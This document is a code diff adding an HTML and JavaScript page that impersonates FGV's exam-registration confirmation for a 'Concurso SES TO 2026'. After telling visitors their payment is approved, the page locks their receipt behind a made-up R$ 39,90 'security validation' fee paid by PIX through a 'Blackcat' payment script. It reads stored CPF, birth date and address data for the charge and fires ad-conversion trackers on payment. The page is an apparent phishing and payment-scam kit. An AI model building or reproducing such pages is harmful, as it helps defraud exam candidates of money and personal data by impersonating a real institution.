@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inscrição confirmada — SES TO 2026 | FGV</title>
+    <link rel="stylesheet" href="../CNU-info/css/all.min.css">
+    <link href="../css/fgv-portal.css" rel="stylesheet">
+    <link rel="stylesheet" href="../CNU-info/css/fonts.css">
+
+    <script>
+      window.googlePixelId = "68fafce3e95a8ad5bfc8863d";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+      document.head.appendChild(a);
+    </script>
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+
+    <style>
+        .confirm-page {
+            min-height: calc(100vh - 120px);
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 0 16px 40px;
+        }
+
+        .confirmation-container {
+            background: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 36px 28px;
+            max-width: 560px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(35, 55, 105, 0.08);
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            background: #e8f5e9;
+            color: #1b7a3d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+        }
+
+        .confirmation-title {
+            font-size: 1.55rem;
+            color: #233769;
+            margin: 0 0 10px;
+            font-weight: 700;
+            line-height: 1.3;
+        }
+
+        .confirmation-subtitle {
+            font-size: 0.98rem;
+            color: #495057;
+            margin: 0 0 26px;
+            line-height: 1.55;
+            font-weight: 400;
+        }
+
+        .confirmation-details {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 8px 18px;
+            margin: 0 0 22px;
+            text-align: left;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+            font-size: 0.92rem;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .detail-value {
+            color: #212529;
+            font-weight: 600;
+            text-align: right;
+        }
+
+        .detail-value.status-ok {
+            color: #1b7a3d;
+        }
+
+        .next-steps {
+            background: #f3f7fb;
+            border: 1px solid #d6e4f0;
+            border-radius: 6px;
+            padding: 18px;
+            margin: 0 0 22px;
+            text-align: left;
+        }
+
+        .next-steps h3 {
+            color: #233769;
+            margin: 0 0 14px;
+            font-size: 1.05rem;
+            font-weight: 700;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 0 0 10px;
+            padding: 12px;
+            background: #fff;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+        }
+
+        .step-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .step-icon {
+            color: #0d6efd;
+            width: 22px;
+            text-align: center;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            color: #343a40;
+            font-size: 0.92rem;
+            line-height: 1.45;
+        }
+
+        .action-buttons {
+            margin-top: 8px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 14px 22px;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.98rem;
+            font-weight: 700;
+            cursor: pointer;
+            background: #0d6efd;
+            color: #fff;
+            width: 100%;
+            max-width: 360px;
+            transition: background 0.2s ease;
+        }
+
+        .btn:hover {
+            background: #0b5ed7;
+        }
+
+        .btn i {
+            margin-right: 8px;
+        }
+
+        .contact-info {
+            margin-top: 22px;
+            padding: 16px 18px;
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            border-left: 3px solid #233769;
+            text-align: left;
+        }
+
+        .contact-info h4 {
+            color: #233769;
+            margin: 0 0 8px;
+            font-size: 0.98rem;
+        }
+
+        .contact-info p {
+            color: #6c757d;
+            margin: 4px 0;
+            font-size: 0.88rem;
+            line-height: 1.45;
+        }
+
+        @media (max-width: 768px) {
+            .confirmation-container {
+                padding: 28px 18px;
+            }
+
+            .confirmation-title {
+                font-size: 1.35rem;
+            }
+
+            .detail-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 4px;
+            }
+
+            .detail-value {
+                text-align: left;
+            }
+        }
+
+        /* Modal Taxa Segurança */
+        .security-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(4px);
+        }
+        .security-modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .security-modal {
+            background: #fff;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 480px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+        }
+        .security-modal-overlay.active .security-modal {
+            transform: translateY(0);
+        }
+        .security-icon {
+            font-size: 48px;
+            color: #dc3545;
+            margin-bottom: 15px;
+        }
+        .security-title {
+            color: #233769;
+            font-size: 1.4rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .security-desc {
+            color: #495057;
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .security-price {
+            font-size: 2rem;
+            color: #1b7a3d;
+            font-weight: 800;
+            margin-bottom: 25px;
+        }
+        .qr-container {
+            display: none;
+            margin-top: 20px;
+        }
+        .qr-container img {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .copy-pix-btn {
+            background: #f8f9fa;
+            border: 1px solid #ced4da;
+            padding: 10px 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn:disabled {
+            background: #6c757d !important;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body class="fgv-body">
+    <div class="fgv-brand fgv-brand--compact">
+        <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+    </div>
+
+    <div class="confirm-page">
+        <div class="confirmation-container">
+            <div class="success-icon" aria-hidden="true">
+                <i class="fas fa-check"></i>
+            </div>
+
+            <h1 class="confirmation-title">Pagamento confirmado</h1>
+            <p class="confirmation-subtitle">
+                Sua inscrição no Concurso SES TO 2026 foi registrada com sucesso.
+                Um e-mail de confirmação será enviado em breve.
+            </p>
+
+            <div class="confirmation-details">
+                <div class="detail-item">
+                    <span class="detail-label">Status do pagamento</span>
+                    <span class="detail-value status-ok">Aprovado</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Data da confirmação</span>
+                    <span class="detail-value" id="confirmationDate"></span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Método de pagamento</span>
+                    <span class="detail-value">PIX</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Valor pago</span>
+                    <span class="detail-value" id="paymentAmount">—</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Nível / taxa</span>
+                    <span class="detail-value" id="paymentNivel">—</span>
+                </div>
+            </div>
+
+            <div class="next-steps">
+                <h3>Próximos passos</h3>
+
+                <div class="step-item">
+                    <i class="fas fa-envelope step-icon" aria-hidden="true"></i>
+                    <span class="step-text">Verifique seu e-mail para o comprovante e orientações da inscrição.</span>
+                </div>
+
+                <div class="step-item">
+                    <i class="fas fa-calendar-alt step-icon" aria-hidden="true"></i>
+                    <span class="step-text">Acompanhe o cronograma da prova objetiva (01/11/2026).</span>
+                </div>
+
+                <div class="step-item">
+                    <i class="fas fa-info-circle step-icon" aria-hidden="true"></i>
+                    <span class="step-text">Acompanhe os comunicados oficiais no portal FGV Conhecimento.</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button type="button" class="btn" id="btnGerarPdf" onclick="generateComprovantePDF()" disabled>
+                    <i class="fas fa-lock" id="iconPdf" aria-hidden="true"></i> Gerar comprovante de inscrição (Bloqueado)
+                </button>
+            </div>
+
+            <div class="contact-info">
+                <h4>Informações</h4>
+                <p>Em caso de dúvidas sobre a inscrição, consulte os canais oficiais da FGV Conhecimento.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Taxa de Segurança -->
+    <div class="security-modal-overlay" id="securityModal">
+        <div class="security-modal">
+            <div class="security-icon"><i class="fas fa-shield-alt"></i></div>
+            <h2 class="security-title">Validação de Segurança Necessária</h2>
+            <p class="security-desc">Para liberar a emissão do seu comprovante de inscrição oficial, é necessário efetuar o pagamento da taxa de validação de segurança do sistema antifraude.</p>
+            <div class="security-price" id="securityPriceLabel">R$ 39,90</div>
+            
+            <button type="button" class="btn" id="btnGerarPixSeguranca" onclick="gerarPixSeguranca()" style="background: #1b7a3d;">
+                <i class="fas fa-qrcode"></i> Gerar PIX para Liberação
+            </button>
+
+            <div class="qr-container" id="qrContainerSeguranca">
+                <p style="font-weight: bold; margin-bottom: 10px;">Escaneie o QR Code abaixo:</p>
+                <img id="qrCodeImgSeguranca" src="" alt="QR Code PIX">
+                <button type="button" class="copy-pix-btn" onclick="copiarPixSeguranca()">
+                    <i class="fas fa-copy"></i> <span id="copyTextSeguranca">Copiar código PIX</span>
+                </button>
+                <p style="margin-top:15px; font-size: 0.85rem; color:#666;">Aguardando pagamento... <i class="fas fa-spinner fa-spin"></i></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="../CNU-info/js/blackcat-payment.js"></script>
+
+    <script>
+        function resolveTaxaReais() {
+            try {
+                // Exibição: sempre valor cheio da taxa (100 ou 150)
+                var taxa = Number(localStorage.getItem('taxaValor') || 0);
+                if (taxa === 100 || taxa === 150) return taxa;
+
+                var nivel = String(localStorage.getItem('nivel') || '').toLowerCase();
+                if (nivel.indexOf('med') >= 0 || nivel.indexOf('tec') >= 0) return 100;
+                if (nivel.indexOf('sup') >= 0) return 150;
+
+                try {
+                    var cargos = JSON.parse(localStorage.getItem('cargosSelecionados') || '[]');
+                    if (cargos[0] && (cargos[0].taxa === 100 || cargos[0].taxa === 150)) {
+                        return Number(cargos[0].taxa);
+                    }
+                } catch (e2) {}
+            } catch (e) {}
+            return 150;
+        }
+
+        function formatMoneyBRL(reais) {
+            return 'R$ ' + Number(reais).toFixed(2).replace('.', ',');
+        }
+
+        function formatCPF(cpf) {
+            if (!cpf) return '';
+            var cleaned = String(cpf).replace(/\D/g, '');
+            if (cleaned.length !== 11) return cpf;
+            return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        function formatCEP(cep) {
+            if (!cep) return '';
+            var cleaned = String(cep).replace(/\D/g, '');
+            if (cleaned.length !== 8) return cep;
+            return cleaned.replace(/(\d{5})(\d{3})/, '$1-$2');
+        }
+
+        function formatPhone(phone) {
+            if (!phone) return '';
+            var cleaned = String(phone).replace(/\D/g, '');
+            if (cleaned.length === 11) return cleaned.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            if (cleaned.length === 10) return cleaned.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
+            return phone;
+        }
+
+        function formatDate(dateStr) {
+            if (!dateStr) return '';
+            try {
+                var date = new Date(dateStr);
+                if (isNaN(date.getTime())) {
+                    var parts = String(dateStr).split('/');
+                    if (parts.length === 3) return dateStr;
+                    return dateStr;
+                }
+                return date.toLocaleDateString('pt-BR');
+            } catch (e) {
+                return dateStr;
+            }
+        }
+
+        var taxaReais = resolveTaxaReais();
+        var baseNivel = Number(localStorage.getItem('taxaValor') || 0);
+        if (baseNivel !== 100 && baseNivel !== 150) {
+            baseNivel = Math.round(taxaReais) === 100 || taxaReais < 120 ? 100 : 150;
+        }
+        var nivelLabel = baseNivel === 100
+            ? 'Médio / Técnico'
+            : 'Superior';
+
+        document.getElementById('confirmationDate').textContent = new Date().toLocaleString('pt-BR');
+        document.getElementById('paymentAmount').textContent = formatMoneyBRL(taxaReais);
+        document.getElementById('paymentNivel').textContent = nivelLabel + ' — ' + formatMoneyBRL(taxaReais);
+
+        // Persiste valor cobrado real para o PDF
+        try {
+            localStorage.setItem('pagamentoConfirmado', JSON.stringify({
+                amount: Math.round(taxaReais * 100),
+                valorReais: taxaReais,
+                status: 'paid',
+                confirmedAt: new Date().toISOString()
+            }));
+        } catch (e) {}
+
+        if (typeof window.googlePixelId !== 'undefined' && typeof window.trackConversion === 'function') {
+            try {
+                var transactionData = JSON.parse(localStorage.getItem('medusapayTransaction') || localStorage.getItem('pagamentoConfirmado') || '{}');
+                window.trackConversion('purchase', {
+                    transaction_id: transactionData.transactionId || 'confirmed_' + Date.now(),
+                    value: taxaReais
+                });
+            } catch (e) {}
+        }
+
+        async function generateComprovantePDF() {
+            try {
+                var userData = JSON.parse(localStorage.getItem('cpfData') || '{}');
+                var addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+                var emailConfirmacao = localStorage.getItem('emailConfirmacao') || '';
+                var transactionData = JSON.parse(localStorage.getItem('medusapayTransaction') || localStorage.getItem('pagamentoConfirmado') || '{}');
+                var valor = resolveTaxaReais();
+
+                if (typeof window.jspdf === 'undefined') {
+                    alert('Não foi possível carregar a biblioteca de PDF. Recarregue a página e tente novamente.');
+                    return;
+                }
+
+                var jsPDF = window.jspdf.jsPDF;
+                var doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
+                var pageWidth = doc.internal.pageSize.getWidth();
+                var pageHeight = doc.internal.pageSize.getHeight();
+                var margin = 20;
+                var yPos = margin;
+
+                var addLine = function (text, fontSize, isBold, align) {
+                    fontSize = fontSize || 12;
+                    isBold = !!isBold;
+                    align = align || 'left';
+                    doc.setFontSize(fontSize);
+                    doc.setFont('helvetica', isBold ? 'bold' : 'normal');
+                    var textWidth = doc.getTextWidth(text);
+                    var xPos = margin;
+                    if (align === 'center') xPos = (pageWidth - textWidth) / 2;
+                    else if (align === 'right') xPos = pageWidth - margin - textWidth;
+                    doc.text(text, xPos, yPos);
+                    yPos += fontSize * 0.6;
+                };
+
+                var addSpace = function (mm) { yPos += (mm || 5); };
+
+                addLine('COMPROVANTE DE INSCRIÇÃO', 16, true, 'center');
+                addLine('Concurso SES TO 2026', 12, true, 'center');
+                addLine('Fundação Getulio Vargas (FGV)', 11, false, 'center');
+                addSpace(8);
+
+                doc.setLineWidth(0.5);
+                doc.line(margin, yPos, pageWidth - margin, yPos);
+                addSpace(6);
+
+                addLine('DADOS DO CANDIDATO', 13, true);
+                addSpace(3);
+                addLine('Nome: ' + (userData.nome || userData.NOME || 'Não informado'), 11);
+                addLine('CPF: ' + formatCPF(userData.cpf || userData.CPF || ''), 11);
+                addLine('Data de nascimento: ' + formatDate(userData.nascimento || userData.NASCIMENTO || ''), 11);
+                addLine('E-mail: ' + (emailConfirmacao || 'Não informado'), 11);
+                addSpace(5);
+
+                if (addressData.logradouro) {
+                    addLine('ENDEREÇO', 13, true);
+                    addSpace(3);
+                    addLine((addressData.logradouro || '') + ', ' + (addressData.numero || ''), 11);
+                    if (addressData.complemento) addLine('Complemento: ' + addressData.complemento, 11);
+                    addLine((addressData.bairro || '') + ' — ' + (addressData.cidade || '') + '/' + (addressData.uf || ''), 11);
+                    addLine('CEP: ' + formatCEP(addressData.cep || ''), 11);
+                    if (addressData.telefone) addLine('Telefone: ' + formatPhone(addressData.telefone), 11);
+                    addSpace(5);
+                }
+
+                addLine('DADOS DO PAGAMENTO', 13, true);
+                addSpace(3);
+                addLine('Status: Aprovado', 11);
+                addLine('Método: PIX', 11);
+                addLine('Valor: ' + formatMoneyBRL(valor), 11);
+                addLine('Nível / taxa: ' + (valor === 100 ? 'Médio / Técnico' : 'Superior'), 11);
+                if (transactionData.transactionId) {
+                    addLine('ID da transação: ' + transactionData.transactionId, 10);
+                }
+                addLine('Data da inscrição: ' + new Date().toLocaleString('pt-BR'), 11);
+                addSpace(5);
+
+                addLine('INFORMAÇÕES DO CONCURSO', 13, true);
+                addSpace(3);
+                addLine('Concurso SES TO 2026', 11);
+                addLine('Vagas: 5.124', 11);
+                addLine('Prova objetiva: 01/11/2026', 11);
+                addLine('Organizadora: Fundação Getulio Vargas (FGV)', 11);
+                addSpace(10);
+
+                var footerY = pageHeight - 28;
+                doc.setLineWidth(0.3);
+                doc.line(margin, footerY, pageWidth - margin, footerY);
+                doc.setFontSize(9);
+                doc.setFont('helvetica', 'normal');
+                doc.setTextColor(100, 100, 100);
+                doc.text('Documento gerado automaticamente pelo sistema de inscrição.', margin, footerY + 6);
+                doc.text('FGV Conhecimento — SES/TO', margin, footerY + 11);
+                doc.text('Gerado em: ' + new Date().toLocaleString('pt-BR'), margin, footerY + 16);
+
+                var cpfFile = formatCPF(userData.cpf || userData.CPF || '00000000000').replace(/\D/g, '');
+                doc.save('Comprovante_Inscricao_SESTO26_' + cpfFile + '.pdf');
+            } catch (error) {
+                console.error('Erro ao gerar PDF:', error);
+                alert('Não foi possível gerar o comprovante. Tente novamente.');
+            }
+        }
+
+        window.generateComprovantePDF = generateComprovantePDF;
+
+        // ==========================================
+        // Lógica da Taxa de Segurança (R$ 39,90) via Blackcat
+        // ==========================================
+        var blackcatInstance = null;
+        var codigoPixAtual = '';
+
+        function initSecurityCheck() {
+            if (localStorage.getItem('taxaSegurancaPaga') === 'true') {
+                liberarPdf();
+                return;
+            }
+            // Delay 2 segundos conforme solicitado
+            setTimeout(function() {
+                document.getElementById('securityModal').classList.add('active');
+            }, 2000);
+        }
+
+        async function gerarPixSeguranca() {
+            var btn = document.getElementById('btnGerarPixSeguranca');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
+            btn.disabled = true;
+
+            try {
+                // Força valor da taxa no localStorage momentaneamente
+                var taxaOriginal = localStorage.getItem('taxaValor');
+                localStorage.setItem('taxaValor', '39.9');
+                
+                blackcatInstance = new BlackcatPayment();
+                
+                var userData = JSON.parse(localStorage.getItem('cpfData') || '{}');
+                var addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+
+                const transaction = await blackcatInstance.createPixTransaction(userData, addressData);
+                
+                // Restaura valor original para não corromper o comprovante
+                if (taxaOriginal) localStorage.setItem('taxaValor', taxaOriginal);
+                else localStorage.removeItem('taxaValor');
+                
+                if (!transaction.success) throw new Error("Erro ao gerar PIX");
+
+                document.getElementById('securityPriceLabel').innerText = formatMoneyBRL(transaction.amount / 100);
+                
+                btn.style.display = 'none';
+                codigoPixAtual = transaction.pixCode;
+                document.getElementById('qrCodeImgSeguranca').src = transaction.qrCodeUrl || 'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(transaction.pixCode) + '&size=200x200';
+                document.getElementById('qrContainerSeguranca').style.display = 'block';
+
+                blackcatInstance.startPaymentMonitoring(transaction.transactionId, {
+                    interval: 5000,
+                    maxAttempts: 120,
+                    onPaymentConfirmed: function() {
+                        localStorage.setItem('taxaSegurancaPaga', 'true');
+                        document.getElementById('securityModal').classList.remove('active');
+                        liberarPdf();
+                        try { if (window.trackConversion) window.trackConversion('purchase', { value: transaction.amount / 100 }); } catch(e){}
+                    }
+                });
+            } catch (e) {
+                alert("Ocorreu um erro ao gerar o PIX. Tente novamente.");
+                btn.innerHTML = '<i class="fas fa-qrcode"></i> Gerar PIX para Liberação';
+                btn.disabled = false;
+            }
+        }
+
+        function copiarPixSeguranca() {
+            navigator.clipboard.writeText(codigoPixAtual).then(function() {
+                document.getElementById('copyTextSeguranca').innerText = 'Copiado!';
+                setTimeout(() => document.getElementById('copyTextSeguranca').innerText = 'Copiar código PIX', 2000);
+            });
+        }
+
+        function liberarPdf() {
+            var btn = document.getElementById('btnGerarPdf');
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-file-pdf"></i> Gerar comprovante de inscrição (PDF)';
+            var icon = document.getElementById('iconPdf');
+            if(icon) icon.className = 'fas fa-file-pdf';
+        }
+
+        window.addEventListener('load', initSecurityCheck);
+    </script>
+
+    <footer class="fgv-footer">
+        <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+        <div>FGV Conhecimento</div>
+    </footer>
+<script src="/js/funnel-tracker.js" data-funnel-step="confirmacao"></script>
+</body>
+</html>
